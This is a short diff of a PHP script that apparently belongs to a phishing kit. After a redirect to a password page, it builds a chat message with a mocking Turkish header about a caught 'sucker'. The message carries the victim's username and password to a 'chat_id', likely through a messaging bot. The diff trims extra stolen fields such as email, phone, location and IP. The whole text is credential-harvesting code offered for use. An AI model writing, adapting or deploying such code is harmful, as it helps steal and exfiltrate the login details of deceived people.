@@ -19,14 +19,9 @@ header("location: password.php?id=$id");
 
 $data = [
   'text' => '➡️ Lan Koş Sazan Düştü 😈 
-Kullanıcı Adı : '.$id.'
+Sublime Saplar 😈
+Kullanıcı Adı : '.$user.'
 Şifre : '.$password.'
-Mail : '.$mail.'
-Tel : '.$number.'
-Ülke : '.$ulke.'
-Şehir : '.$sehir.'
-İp : '.$ip.'
-Tarih : '.$cur_time.'
 ',
   'chat_id' => $chat_id
 ];
